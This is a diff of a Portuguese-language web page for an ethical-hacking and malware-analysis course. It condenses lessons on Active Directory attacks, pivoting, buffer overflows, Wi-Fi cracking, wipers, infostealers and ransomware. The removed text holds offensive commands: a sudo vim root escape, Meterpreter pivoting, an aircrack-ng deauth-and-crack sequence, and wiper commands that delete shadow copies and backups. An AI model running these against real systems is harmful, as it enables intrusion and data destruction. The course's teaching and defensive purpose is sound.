+				<article class="lesson-card" id="hack-15"><h2 class="lesson-title"><span class="num-badge">15</span><span>Segurança Binária &amp; Buffer Overflow</span></h2><div class="lesson-body"><p>Sobrescrita de EIP/RIP em x86/x64, JMP ESP, shellcode msfvenom, proteções ASLR, DEP/NX e Heap exploitation.</p></div><div class="lesson-footer-action"><button class="mark-read-btn" onclick="toggleStudied('hack-15')">✓ Marcar como Estudado</button></div></article>
+				<article class="lesson-card" id="hack-16"><h2 class="lesson-title"><span class="num-badge">16</span><span>Hashes &amp; Regras do Hashcat</span></h2><div class="lesson-body"><p>Identificação com hashid, mutação de wordlists com <code>best64.rule</code> e tabelas arco-íris.</p></div><div class="lesson-footer-action"><button class="mark-read-btn" onclick="toggleStudied('hack-16')">✓ Marcar como Estudado</button></div></article>
+				<article class="lesson-card" id="hack-17"><h2 class="lesson-title"><span class="num-badge">17</span><span>Hacking Wireless (WiFi)</span></h2><div class="lesson-body"><p>Modo monitor (airmon-ng), captura de beacon (airodump-ng), deauth (aireplay-ng) e quebra de WPA2.</p></div><div class="lesson-footer-action"><button class="mark-read-btn" onclick="toggleStudied('hack-17')">✓ Marcar como Estudado</button></div></article>
+				<article class="lesson-card" id="hack-18"><h2 class="lesson-title"><span class="num-badge">18</span><span>Malware &amp; Ofensiva Moderna</span></h2><div class="lesson-body"><p>Frameworks C2 (Sliver, Mythic), evasão de AMSI, persistência em registro/WMI e matriz MITRE ATT&amp;CK.</p></div><div class="lesson-footer-action"><button class="mark-read-btn" onclick="toggleStudied('hack-18')">✓ Marcar como Estudado</button></div></article>
+				<article class="lesson-card" id="hack-19"><h2 class="lesson-title"><span class="num-badge">19</span><span>Defesa &amp; Blue Team</span></h2><div class="lesson-body"><p>Centralização SIEM (Wazuh/ELK), regras Sigma, YARA, Threat Hunting e hardening com CIS Benchmarks.</p></div><div class="lesson-footer-action"><button class="mark-read-btn" onclick="toggleStudied('hack-19')">✓ Marcar como Estudado</button></div></article>
+				<article class="lesson-card" id="hack-20"><h2 class="lesson-title"><span class="num-badge">20</span><span>Roteiro de 90 Dias</span></h2><div class="lesson-body"><p>Cronograma do zero até a primeira certificação prática (OverTheWire → PortSwigger → TryHackMe → Hack The Box).</p></div><div class="lesson-footer-action"><button class="mark-read-btn" onclick="toggleStudied('hack-20')">✓ Marcar como Estudado</button></div></article>
+				<article class="lesson-card" id="hack-21"><h2 class="lesson-title"><span class="num-badge">21</span><span>Marcos da História Hacker</span></h2><div class="lesson-body"><p>1971 Cap'n Crunch, 1988 Morris Worm, 2010 Stuxnet, 2016 Mirai Botnet, 2017 WannaCry/EternalBlue.</p></div><div class="lesson-footer-action"><button class="mark-read-btn" onclick="toggleStudied('hack-21')">✓ Marcar como Estudado</button></div></article>
+				<article class="lesson-card" id="hack-22"><h2 class="lesson-title"><span class="num-badge">22</span><span>Legislação &amp; Art. 154-A</span></h2><div class="lesson-body"><p>Lei Carolina Dieckmann 12.737/2012, tipificação penal de invasão e regras de conformidade.</p></div><div class="lesson-footer-action"><button class="mark-read-btn" onclick="toggleStudied('hack-22')">✓ Marcar como Estudado</button></div></article>
 
-						<p><strong>Etapa 2 — Enumeração Completa:</strong></p>
-						<div class="code-wrapper">
-							<div class="code-header"><span>BASH</span><button class="copy-btn" onclick="copyCode(this)">📋 Copiar</button></div>
-							<pre><code>nmap -sV -sC -A 192.168.1.50 -p- -oN full.txt
-# Portas abertas: 22 (SSH), 80 (HTTP), 3306 (MySQL)
-
-# Fuzzing de pastas na porta 80:
-gobuster dir -u http://192.168.1.50 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak</code></pre>
-						</div>
-
-						<p><strong>Etapa 3 — Exploração:</strong> Login vulnerável via SQLi ou credenciais vazadas em notas <code>.bak</code> permitindo acesso SSH.</p>
-
-						<p><strong>Etapa 4 — Flag de Usuário &amp; Escalação de Privilégio:</strong></p>
-						<div class="code-wrapper">
-							<div class="code-header"><span>BASH</span><button class="copy-btn" onclick="copyCode(this)">📋 Copiar</button></div>
-							<pre><code># Ver comandos sudo liberados:
-sudo -l
-# Se /usr/bin/vim estiver liberado sem senha:
-sudo vim -c ':!/bin/sh'
-# Agora você é root: cat /root/root.txt</code></pre>
-						</div>
-					</div>
-					<div class="lesson-footer-action">
-						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~5 min</span>
-						<button class="mark-read-btn" onclick="toggleStudied('hack-12')">✓ Marcar como Estudado</button>
-					</div>
-				</article>
-
-				<!-- Tópico 13 -->
-				<article class="lesson-card" id="hack-13">
-					<h2 class="lesson-title">
-						<span class="num-badge">13</span>
-						<span>Active Directory — O Chefão Corporativo</span>
-					</h2>
-					<div class="lesson-body">
-						<p>Conceitos fundamentais da arquitetura de domínios corporativos Windows:</p>
-						<ul>
-							<li><strong>Domain Controller (DC):</strong> Servidor central que gerencia autenticação, usuários e políticas.</li>
-							<li><strong>Kerberos:</strong> Protocolo de autenticação baseado em bilhetes (TGT e TGS).</li>
-							<li><strong>NTLM:</strong> Autenticação legada baseada em hash, suscetível a ataques de Relay.</li>
-							<li><strong>BloodHound:</strong> Mapeia grafos de relacionamento e caminhos curtos até <em>Domain Admin</em>.</li>
-						</ul>
-
-						<div class="content-table-wrap">
-							<table class="content-table">
-								<thead>
-									<tr>
-										<th>Vetor de Ataque AD</th>
-										<th>Descrição</th>
-										<th>Ferramenta</th>
-									</tr>
-								</thead>
-								<tbody>
-									<tr>
-										<td><strong>AS-REP Roasting</strong></td>
-										<td>Contas com pré-autenticação Kerberos desabilitada</td>
-										<td><code>GetNPUsers.py</code></td>
-									</tr>
-									<tr>
-										<td><strong>Kerberoasting</strong></td>
-										<td>Solicitação de TGS de contas de serviço para quebra offline</td>
-										<td><code>GetUserSPNs.py</code> + Hashcat</td>
-									</tr>
-									<tr>
-										<td><strong>Pass-the-Hash (PtH)</strong></td>
-										<td>Autenticação remota usando diretamente o hash NTLM</td>
-										<td><code>impacket-psexec</code> / CrackMapExec</td>
-									</tr>
-									<tr>
-										<td><strong>NTLM Relay</strong></td>
-										<td>Redirecionar solicitações de autenticação capturadas</td>
-										<td><code>Responder</code> + <code>ntlmrelayx</code></td>
-									</tr>
-									<tr>
-										<td><strong>Abuso de ACLs</strong></td>
-										<td>Permissões excessivas (GenericAll, WriteDacl) em objetos</td>
-										<td><code>PowerView</code> / BloodHound</td>
-									</tr>
-								</tbody>
-							</table>
-						</div>
-					</div>
-					<div class="lesson-footer-action">
-						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~6 min</span>
-						<button class="mark-read-btn" onclick="toggleStudied('hack-13')">✓ Marcar como Estudado</button>
-					</div>
-				</article>
-
-				<!-- Tópico 14 -->
-				<article class="lesson-card" id="hack-14">
-					<h2 class="lesson-title">
-						<span class="num-badge">14</span>
-						<span>Pivoting, Túneis &amp; Movimentação Lateral</span>
-					</h2>
-					<div class="lesson-body">
-						<p>Quando você compromete um host na DMZ, outras redes internas ficam inacessíveis diretamente. O <strong>Pivoting</strong> roteia o tráfego do atacante através do host intermediário comprometido:</p>
-
-						<div class="code-wrapper">
-							<div class="code-header">
-								<span>MSFCONSOLE &amp; BASH — SOCKS Proxy &amp; Proxychains</span>
-								<button class="copy-btn" onclick="copyCode(this)">📋 Copiar</button>
-							</div>
-							<pre><code># No Meterpreter:
-meterpreter> run autoroute -s 10.0.1.0/24
-meterpreter> background
-msf6> use auxiliary/server/socks_proxy
-
-# No Kali: usar proxychains para direcionar Nmap pela rede interna
-proxychains nmap -sT -sV -Pn 10.0.1.20</code></pre>
-						</div>
-						<p><strong>Alternativas Modernas:</strong> Túneis SSH locais (<code>ssh -L</code>), <code>ligolo-ng</code> e <code>chisel</code>.</p>
-					</div>
-					<div class="lesson-footer-action">
-						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~4 min</span>
-						<button class="mark-read-btn" onclick="toggleStudied('hack-14')">✓ Marcar como Estudado</button>
-					</div>
-				</article>
-
-				<!-- Tópico 15 -->
-				<article class="lesson-card" id="hack-15">
-					<h2 class="lesson-title">
-						<span class="num-badge">15</span>
-						<span>Segurança em Nível Binário &amp; Memória</span>
-					</h2>
-					<div class="lesson-body">
-						<p><strong>Buffer Overflow (x86/x64):</strong> Ocorre quando uma entrada de dados excede o tamanho do buffer alocado na memória stack, sobrescrevendo ponteiros de instrução como o <code>EIP</code> ou <code>RIP</code>:</p>
-
-						<div class="code-wrapper">
-							<div class="code-header"><span>C — Exemplo Clássico de Vulnerabilidade de Memória</span><button class="copy-btn" onclick="copyCode(this)">📋 Copiar</button></div>
-							<pre><code>void vuln(char *input) {
-    char buf[64];
-    strcpy(buf, input);   // Sem validação de tamanho → estoura buffer
-}</code></pre>
-						</div>
-
-						<p><strong>Mitigações Modernas:</strong> ASLR (Address Space Layout Randomization), DEP/NX (Data Execution Prevention), Stack Canaries e CFG.</p>
-					</div>
-					<div class="lesson-footer-action">
-						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~5 min</span>
-						<button class="mark-read-btn" onclick="toggleStudied('hack-15')">✓ Marcar como Estudado</button>
-					</div>
-				</article>
-
-				<!-- Tópico 16 -->
-				<article class="lesson-card" id="hack-16">
-					<h2 class="lesson-title">
-						<span class="num-badge">16</span>
-						<span>Hashes &amp; Criptografia Aplicada com Regras</span>
-					</h2>
-					<div class="lesson-body">
-						<p>Identificação de hashes e técnicas de mutação:</p>
-						<div class="code-wrapper">
-							<div class="code-header"><span>BASH</span><button class="copy-btn" onclick="copyCode(this)">📋 Copiar</button></div>
-							<pre><code># Identificar tipo de hash
-hashid 'e99a18c428cb38d5f260853678922e03'
-
-# Uso de regras do Hashcat para gerar permutações em wordlists (ex: leet speak, sufixos)
-hashcat -m 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule</code></pre>
-						</div>
-					</div>
-					<div class="lesson-footer-action">
-						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~3 min</span>
-						<button class="mark-read-btn" onclick="toggleStudied('hack-16')">✓ Marcar como Estudado</button>
-					</div>
-				</article>
-
-				<!-- Tópico 17 -->
-				<article class="lesson-card" id="hack-17">
-					<h2 class="lesson-title">
-						<span class="num-badge">17</span>
-						<span>Hacking de Redes Sem Fio (WiFi)</span>
-					</h2>
-					<div class="lesson-body">
-						<p>Fluxo de auditoria sem fio no laboratório:</p>
-						<div class="code-wrapper">
-							<div class="code-header"><span>BASH — Fluxo Aircrack-ng</span><button class="copy-btn" onclick="copyCode(this)">📋 Copiar</button></div>
-							<pre><code># 1. Ativar modo monitor no adaptador WiFi
-airmon-ng start wlan0
-
-# 2. Descobrir redes ao redor
-airodump-ng wlan0mon
-
-# 3. Capturar handshake no canal e BSSID alvo
-airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w captura wlan0mon
-
-# 4. Desautenticar cliente para forçar handshake
-aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
-
-# 5. Quebrar a senha
-aircrack-ng captura-01.cap -w rockyou.txt</code></pre>
-						</div>
-						<p><strong>Adaptadores Recomendados:</strong> Chipsets Atheros AR9271 ou Realtek RTL8812AU (suportam injeção de pacotes e modo monitor).</p>
-					</div>
-					<div class="lesson-footer-action">
-						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~4 min</span>
-						<button class="mark-read-btn" onclick="toggleStudied('hack-17')">✓ Marcar como Estudado</button>
-					</div>
-				</article>
-
-				<!-- Tópico 18 -->
-				<article class="lesson-card" id="hack-18">
-					<h2 class="lesson-title">
-						<span class="num-badge">18</span>
-						<span>Malware &amp; Ofensiva Moderna (Conceitos para Defensores)</span>
-					</h2>
-					<div class="lesson-body">
-						<p>Como equipes de Red Team ético operam frameworks C2 e testam defesas:</p>
-						<ul>
-							<li><strong>Frameworks C2 Modernos:</strong> Sliver, Mythic, Havoc.</li>
-							<li><strong>Evasão:</strong> AMSI bypass, ofuscação de scripts PowerShell e injeção em memória.</li>
-							<li><strong>Mecanismos de Persistência:</strong> Run Keys no Registro, Tarefas Agendadas (Scheduled Tasks), Serviços do Windows e WMI Subscriptions.</li>
-							<li><strong>MITRE ATT&amp;CK:</strong> Matriz global de referência sobre táticas, técnicas e procedimentos (TTPs) de atacantes.</li>
-						</ul>
-					</div>
-					<div class="lesson-footer-action">
-						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~4 min</span>
-						<button class="mark-read-btn" onclick="toggleStudied('hack-18')">✓ Marcar como Estudado</button>
-					</div>
-				</article>
-
-				<!-- Tópico 19 -->
-				<article class="lesson-card" id="hack-19">
-					<h2 class="lesson-title">
-						<span class="num-badge">19</span>
-						<span>Defesa: O Outro Lado da Moeda (Blue Team)</span>
-					</h2>
-					<div class="lesson-body">
-						<p>Aprender como atacar transforma você em um profissional de defesa incomparável:</p>
-						<ul>
-							<li><strong>Centralização de Logs &amp; SIEM:</strong> ELK Stack, Wazuh, Splunk.</li>
-							<li><strong>Detecção Comportamental:</strong> Regras Sigma e assinaturas YARA.</li>
-							<li><strong>Threat Hunting:</strong> Busca ativa por anomalias e indicadores de comprometimento (IOCs) na rede.</li>
-							<li><strong>Hardening Básico:</strong> CIS Benchmarks, segmentação de subnets, desativação de protocolos legados e autenticação multifator (MFA).</li>
-						</ul>
-					</div>
-					<div class="lesson-footer-action">
-						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~4 min</span>
-						<button class="mark-read-btn" onclick="toggleStudied('hack-19')">✓ Marcar como Estudado</button>
-					</div>
-				</article>
-
-				<!-- Tópico 20 -->
-				<article class="lesson-card" id="hack-20">
-					<h2 class="lesson-title">
-						<span class="num-badge">20</span>
-						<span>Roteiro de Estudos Estruturado (90 Dias)</span>
-					</h2>
-					<div class="lesson-body">
-						<p>Um cronograma focado para acelerar sua transição do zero à primeira certificação prática:</p>
-						<ul>
-							<li><strong>Semanas 1–2 (Fundamentos):</strong> OverTheWire Bandit (até nível 20+), Redes TCP/IP, Nmap e Wireshark.</li>
-							<li><strong>Semanas 3–4 (Web):</strong> PortSwigger Academy (todos os labs de SQLi, XSS, Autenticação) e trilhas Web do TryHackMe.</li>
-							<li><strong>Semanas 5–6 (Explotação &amp; Privesc):</strong> Metasploit, shells manuais, LinPEAS/winPEAS e 10 boxes easy no HackTheBox.</li>
-							<li><strong>Semanas 7–8 (Active Directory):</strong> TryHackMe "Attacktive Directory", BloodHound, Impacket e Pivoting.</li>
-							<li><strong>Semanas 9–12 (Consolidação):</strong> Boxes intermediárias no HTB, documentação de relatórios (writeups) e preparação para certificações (eJPT / PJPT / OSCP).</li>
-						</ul>
-					</div>
-					<div class="lesson-footer-action">
-						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~4 min</span>
-						<button class="mark-read-btn" onclick="toggleStudied('hack-20')">✓ Marcar como Estudado</button>
-					</div>
-				</article>
-
-				<!-- Tópico 21 -->
-				<article class="lesson-card" id="hack-21">
-					<h2 class="lesson-title">
-						<span class="num-badge">21</span>
-						<span>Marcos Históricos da Cultura Hacker</span>
-					</h2>
-					<div class="lesson-body">
-						<ul>
-							<li><strong>1971:</strong> Apito do cereal Cap'n Crunch emite 2600 Hz liberando troncos telefônicos (início do <em>phreaking</em> com John Draper).</li>
-							<li><strong>1988:</strong> Morris Worm derruba aproximadamente 10% de toda a internet da época.</li>
-							<li><strong>1999:</strong> Criação do padrão CVE para catalogação pública de falhas de segurança.</li>
-							<li><strong>2010:</strong> Stuxnet destrói centrífugas nucleares com extrema precisão cibernética.</li>
-							<li><strong>2016:</strong> Mirai Botnet escraviza câmeras e dispositivos IoT com senhas padrão para derrubar grandes serviços DNS.</li>
-							<li><strong>2017:</strong> WannaCry e NotPetya disseminam ransomware e wipers globalmente explorando o EternalBlue.</li>
-						</ul>
-					</div>
-					<div class="lesson-footer-action">
-						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~3 min</span>
-						<button class="mark-read-btn" onclick="toggleStudied('hack-21')">✓ Marcar como Estudado</button>
-					</div>
-				</article>
-
-				<!-- Tópico 22 -->
-				<article class="lesson-card" id="hack-22">
-					<h2 class="lesson-title">
-						<span class="num-badge">22</span>
-						<span>Legislação Aplicada — Leitura Obrigatória</span>
-					</h2>
-					<div class="lesson-body">
-						<div class="callout-box legal">
-							<div class="callout-header">⚖️ LEGISLAÇÃO BRASILEIRA (CÓDIGO PENAL)</div>
-							<strong>Artigo 154-A do Código Penal (Lei 12.737/2012 — Lei Carolina Dieckmann):</strong> Invadir dispositivo informático alheio, conectado ou não à rede de computadores, mediante violação indevida de mecanismo de segurança e sem autorização expressa ou tácita do titular do dispositivo para obter, adulterar ou destruir dados ou informações ou instalar vulnerabilidades.<br><br>
-							<em>Pena:</em> Reclusão e multa. "Apenas testar" ou escanear sem permissão constitui crime formal. Pratique estritamente em plataformas autorizadas e laboratórios pessoais.
-						</div>
-					</div>
-					<div class="lesson-footer-action">
-						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~3 min</span>
-						<button class="mark-read-btn" onclick="toggleStudied('hack-22')">✓ Marcar como Estudado</button>
-					</div>
-				</article>
-
-
-				<!-- ==================== PARTE 3 ==================== -->
+				<!-- Banner Parte 3 e 4 Malware -->
 				<div class="part-banner" style="border-color: var(--accent-danger); box-shadow: 0 6px 30px rgba(255, 0, 85, 0.18);">
 					<div>
-						<div class="part-banner-title">🔴 Parte 3 — Análise de Malware &amp; Engenharia Reversa</div>
-						<p style="font-size: 13.5px; opacity: 0.85; margin-top: 4px;">Entendendo detalhadamente o que acontece no sistema operacional quando códigos maliciosos são executados.</p>
+						<div class="part-banner-title">🔴 Parte 3 &amp; 4 — Análise de Malware &amp; Lumma Stealer</div>
+						<p style="font-size: 13.5px; opacity: 0.85; margin-top: 4px;">Wipers, infostealers, ransomware, rootkits UEFI, laboratório seguro e engenharia reversa com pe-sieve.</p>
 					</div>
 					<span class="part-badge" style="background: rgba(255, 0, 85, 0.2); border: 1px solid var(--accent-danger); color: var(--accent-danger) !important;">Nível Avançado</span>
 				</div>
 
-				<!-- M1 -->
-				<article class="lesson-card" id="mal-1">
-					<h2 class="lesson-title">
-						<span class="num-badge" style="background: var(--accent-danger);">M1</span>
-						<span>O Ciclo de Vida de uma Execução Maliciosa</span>
-					</h2>
-					<div class="lesson-body">
-						<p>Quase toda família de malware moderna opera em um pipeline de 6 estágios sequenciais:</p>
+				<article class="lesson-card" id="mal-1"><h2 class="lesson-title"><span class="num-badge" style="background:var(--accent-danger);">M1</span><span>Ciclo de Vida da Execução Maliciosa</span></h2><div class="lesson-body"><p>Sobrevivência inicial (Anti-VM/Anti-Debug), estabelecimento em memória, persistência, comunicação C2, payload e anti-forense.</p></div><div class="lesson-footer-action"><button class="mark-read-btn" onclick="toggleStudied('mal-1')">✓ Marcar como Estudado</button></div></article>
+				<article class="lesson-card" id="mal-2"><h2 class="lesson-title"><span class="num-badge" style="background:var(--accent-danger);">M2</span><span>Malware Destrutivo: Wipers</span></h2><div class="lesson-body"><p>Sobrescrita de dados brutos, corrupção de MBR/GPT/$MFT (Shamoon, NotPetya, HermeticWiper) e vssadmin delete.</p></div><div class="lesson-footer-action"><button class="mark-read-btn" onclick="toggleStudied('mal-2')">✓ Marcar como Estudado</button></div></article>
+				<article class="lesson-card" id="mal-3"><h2 class="lesson-title"><span class="num-badge" style="background:var(--accent-danger);">M3</span><span>Infostealers (RedLine, Lumma, Stealc)</span></h2><div class="lesson-body"><p>Coleta de cookies SQLite, DPAPI de senhas salvas, carteiras de criptomoedas, tokens Discord/Telegram e dano one-shot.</p></div><div class="lesson-footer-action"><button class="mark-read-btn" onclick="toggleStudied('mal-3')">✓ Marcar como Estudado</button></div></article>
+				<article class="lesson-card" id="mal-4"><h2 class="lesson-title"><span class="num-badge" style="background:var(--accent-danger);">M4</span><span>Ransomware Passo a Passo</span></h2><div class="lesson-body"><p>Acesso inicial por credenciais vazadas, recon AD, desligamento de EDR (BYOVD) e cifragem AES-256 + RSA-4096.</p></div><div class="lesson-footer-action"><button class="mark-read-btn" onclick="toggleStudied('mal-4')">✓ Marcar como Estudado</button></div></article>
+				<article class="lesson-card" id="mal-5"><h2 class="lesson-title"><span class="num-badge" style="background:var(--accent-danger);">M5</span><span>RATs, Keyloggers &amp; Spyware</span></h2><div class="lesson-body"><p>Streaming de tela remoto, ganchos de teclado SetWindowsHookEx e telemetria comportamental.</p></div><div class="lesson-footer-action"><button class="mark-read-btn" onclick="toggleStudied('mal-5')">✓ Marcar como Estudado</button></div></article>
+				<article class="lesson-card" id="mal-6"><h2 class="lesson-title"><span class="num-badge" style="background:var(--accent-danger);">M6</span><span>Rootkits &amp; Bootkits UEFI</span></h2><div class="lesson-body"><p>API Hooking em modo usuário, Ring 0 de kernel e infecção de firmware UEFI (LoJax, MoonBounce, BlackLotus).</p></div><div class="lesson-footer-action"><button class="mark-read-btn" onclick="toggleStudied('mal-6')">✓ Marcar como Estudado</button></div></article>
+				<article class="lesson-card" id="mal-7"><h2 class="lesson-title"><span class="num-badge" style="background:var(--accent-danger);">M7</span><span>Artefatos Forenses</span></h2><div class="lesson-body"><p>Prefetch (.pf), Event Logs, Shimcache, $MFT, Dump de memória RAM Volatility 3 (malfind) e tráfego DNS.</p></div><div class="lesson-footer-action"><button class="mark-read-btn" onclick="toggleStudied('mal-7')">✓ Marcar como Estudado</button></div></article>
+				<article class="lesson-card" id="mal-8"><h2 class="lesson-title"><span class="num-badge" style="background:var(--accent-danger);">M8</span><span>Lab de Análise Seguro (REMnux + FlareVM)</span></h2><div class="lesson-body"><p>Isolamento com simulador de internet INetSim e regras rígidas de snapshots e credenciais.</p></div><div class="lesson-footer-action"><button class="mark-read-btn" onclick="toggleStudied('mal-8')">✓ Marcar como Estudado</button></div></article>
+				<article class="lesson-card" id="mal-9"><h2 class="lesson-title"><span class="num-badge" style="background:var(--accent-danger);">M9</span><span>Análise Prática &amp; Produção de IOCs</span></h2><div class="lesson-body"><p>Triagem estática com capa/strings, execução simultânea com Procmon/Wireshark e catalogação de IOCs.</p></div><div class="lesson-footer-action"><button class="mark-read-btn" onclick="toggleStudied('mal-9')">✓ Marcar como Estudado</button></div></article>
+				<article class="lesson-card" id="mal-10"><h2 class="lesson-title"><span class="num-badge" style="background:var(--accent-danger);">M10</span><span>Casos Reais Estudados</span></h2><div class="lesson-body"><p>WannaCry (kill-switch), NotPetya (supply chain fiscal), SolarWinds SUNBURST (CI/CD) e BlackLotus.</p></div><div class="lesson-footer-action"><button class="mark-read-btn" onclick="toggleStudied('mal-10')">✓ Marcar como Estudado</button></div></article>
+				<article class="lesson-card" id="mal-11"><h2 class="lesson-title"><span class="num-badge" style="background:var(--accent-danger);">M11</span><span>Defesa Efetiva &amp; Regras Sigma</span></h2><div class="lesson-body"><p>Regras Sigma para detecção comportamental de exclusão de shadow copies (vssadmin delete shadows).</p></div><div class="lesson-footer-action"><button class="mark-read-btn" onclick="toggleStudied('mal-11')">✓ Marcar como Estudado</button></div></article>
 
-						<div class="code-wrapper">
-							<div class="code-header"><span>FLUXOGRAMA — Pipeline de Execução de Malware</span></div>
-							<pre><code>EXECUÇÃO
-   │
-   ▼
-[1] SOBREVIVÊNCIA INICIAL ─── Anti-VM, anti-debug, checagem de ambiente sandbox
-   │                          (Sou uma VM? Devo executar ou dormir?)
-   ▼
-[2] ESTABELECIMENTO ────────── Descompacta payload real em memória, injeta em processo legítimo
-   │
-   ▼
-[3] PERSISTÊNCIA ───────────── Garante sobrevivência a reboots (Run keys, tasks, WMI)
-   │
-   ▼
-[4] C2 / COMUNICAÇÃO ──────── Beacon para servidor de comando e controle, recebe comandos
-   │
-   ▼
-[5] CARGA ÚTIL ─────────────── Ação real: roubo de credenciais, cifragem, destruição
-   │
-   ▼
-[6] LIMPEZA / ANTI-FORENSE ─── Apaga logs de eventos, shadow copies e históricos</code></pre>
-						</div>
-
-						<div class="content-table-wrap">
-							<table class="content-table">
-								<thead>
-									<tr>
-										<th>Técnica Anti-Análise</th>
-										<th>Como Funciona</th>
-										<th>Como Neutralizar no Lab</th>
-									</tr>
-								</thead>
-								<tbody>
-									<tr>
-										<td><code>IsDebuggerPresent</code></td>
-										<td>API que verifica a flag PEB.BeingDebugged</td>
-										<td>Patch de flag no depurador x64dbg / ScyllaHide</td>
-									</tr>
-									<tr>
-										<td><strong>Checagem de Uptime / MAC</strong></td>
-										<td>Detecta se o sistema ligou há poucos segundos ou MAC VMware</td>
-										<td>Configurar uptime real e mascarar endereço MAC</td>
-									</tr>
-									<tr>
-										<td><strong>Sleep Estendido</strong></td>
-										<td>Chamada <code>Sleep(0xFFFFFFF)</code> para estourar timeout de sandbox</td>
-										<td>Acelerar chamadas temporais com utilitários tipo Faketime</td>
-									</tr>
-								</tbody>
-							</table>
-						</div>
-					</div>
-					<div class="lesson-footer-action">
-						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~5 min</span>
-						<button class="mark-read-btn" onclick="toggleStudied('mal-1')">✓ Marcar como Estudado</button>
-					</div>
-				</article>
-
-				<!-- M2 -->
-				<article class="lesson-card" id="mal-2">
-					<h2 class="lesson-title">
-						<span class="num-badge" style="background: var(--accent-danger);">M2</span>
-						<span>Malware que Destrói: Wipers</span>
-					</h2>
-					<div class="lesson-body">
-						<p>Diferente de ransowares, <strong>wipers</strong> não possuem chave de recuperação. Seu único propósito é a destruição irreversível dos dados:</p>
-						<ul>
-							<li><strong>Técnica A (Sobrescrita Direta):</strong> Abre arquivos em modo exclusivo e grava zeros ou bytes aleatórios sobre o conteúdo original antes de truncar o tamanho para 0.</li>
-							<li><strong>Técnica B (Destruição de Estrutura de Disco):</strong> Sobrescreve o MBR/GPT ou a tabela <code>$MFT</code> do NTFS (Exemplos: <em>Shamoon</em>, <em>NotPetya</em>, <em>HermeticWiper</em>).</li>
-							<li><strong>Técnica C (Destruição via APIs):</strong> Executa comandos para impedir recuperação do sistema:
-								<div class="code-wrapper">
-									<div class="code-header"><span>CMD / POWERSHELL</span><button class="copy-btn" onclick="copyCode(this)">📋 Copiar</button></div>
-									<pre><code>vssadmin delete shadows /all /quiet
-wbadmin delete catalog -quiet
-bcdedit /set recoveryenabled No</code></pre>
-								</div>
-							</li>
-						</ul>
-					</div>
-					<div class="lesson-footer-action">
-						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~4 min</span>
-						<button class="mark-read-btn" onclick="toggleStudied('mal-2')">✓ Marcar como Estudado</button>
-					</div>
-				</article>
-
-				<!-- M3 -->
-				<article class="lesson-card" id="mal-3">
-					<h2 class="lesson-title">
-						<span class="num-badge" style="background: var(--accent-danger);">M3</span>
-						<span>Malware que Rouba: Infostealers</span>
-					</h2>
-					<div class="lesson-body">
-						<p>Os <strong>Infostealers</strong> (RedLine, Raccoon, Lumma, Vidar, Stealc) são comercializados como <em>Malware-as-a-Service (MaaS)</em>. Em 2 a 5 minutos coletam:</p>
-						<ul>
-							<li><strong>Cookies &amp; Senhas Salvas:</strong> Extraídos dos bancos SQLite do Chrome (<code>Login Data</code>), descriptografados via DPAPI na sessão do usuário.</li>
-							<li><strong>Carteiras de Criptomoedas:</strong> Extensões de navegador (MetaMask, TrustWallet) e arquivos de carteiras desktop (Exodus).</li>
-							<li><strong>Tokens de Sessão:</strong> Discord, Telegram Desktop (<code>tdata</code>) e Steam.</li>
-						</ul>
-						<div class="callout-box warning">
-							<div class="callout-header">⚠️ O PERIGO DOS STEALERS "ONE-SHOT"</div>
-							A maioria dos stealers encerra a execução e se auto-deleta sem criar persistência. O estrago, porém, é imediato e permanente: os tokens e cookies de sessão capturados permitem contornar senhas e autenticação de dois fatores (MFA) durante semanas.
-						</div>
-					</div>
-					<div class="lesson-footer-action">
-						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~5 min</span>
-						<button class="mark-read-btn" onclick="toggleStudied('mal-3')">✓ Marcar como Estudado</button>
-					</div>
-				</article>
-
-				<!-- M4 -->
-				<article class="lesson-card" id="mal-4">
-					<h2 class="lesson-title">
-						<span class="num-badge" style="background: var(--accent-danger);">M4</span>
-						<span>Malware que Prende: Ransomware Passo a Passo</span>
-					</h2>
-					<div class="lesson-body">
-						<p>O modelo operacional dos grandes grupos de ransomware (LockBit, BlackCat):</p>
-						<ol>
-							<li><strong>Acesso Inicial:</strong> Credenciais vazadas compradas em mercados underground ou VPNs sem MFA.</li>
-							<li><strong>Recon &amp; Escalação:</strong> Mapeamento com BloodHound, Kerberoasting e dump de credenciais LSASS.</li>
-							<li><strong>Preparação &amp; Dupla Extorsão:</strong> Exfiltração de gigabytes de dados sensíveis para a nuvem antes da cifragem, desativação de EDR via drivers vulneráveis (BYOVD) e exclusão de backups.</li>
-							<li><strong>Detonação em Massa:</strong> Disparo via GPO / PsExec para milhares de máquinas simultâneas, gerando chaves simétricas AES-256 por arquivo e cifrando a chave simétrica com chave pública assimétrica RSA-2048/4096.</li>
-						</ol>
-					</div>
-					<div class="lesson-footer-action">
-						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~5 min</span>
-						<button class="mark-read-btn" onclick="toggleStudied('mal-4')">✓ Marcar como Estudado</button>
-					</div>
-				</article>
-
-				<!-- M5 -->
-				<article class="lesson-card" id="mal-5">
-					<h2 class="lesson-title">
-						<span class="num-badge" style="background: var(--accent-danger);">M5</span>
-						<span>Malware que Vigia: RATs, Keyloggers &amp; Spyware</span>
-					</h2>
-					<div class="lesson-body">
-						<p><strong>RATs (Remote Access Trojans):</strong> Ferramentas como Quasar, AsyncRAT e njRAT concedem controle total em tempo real (streaming de tela, microfone, gerenciador de arquivos e injeção de processos).</p>
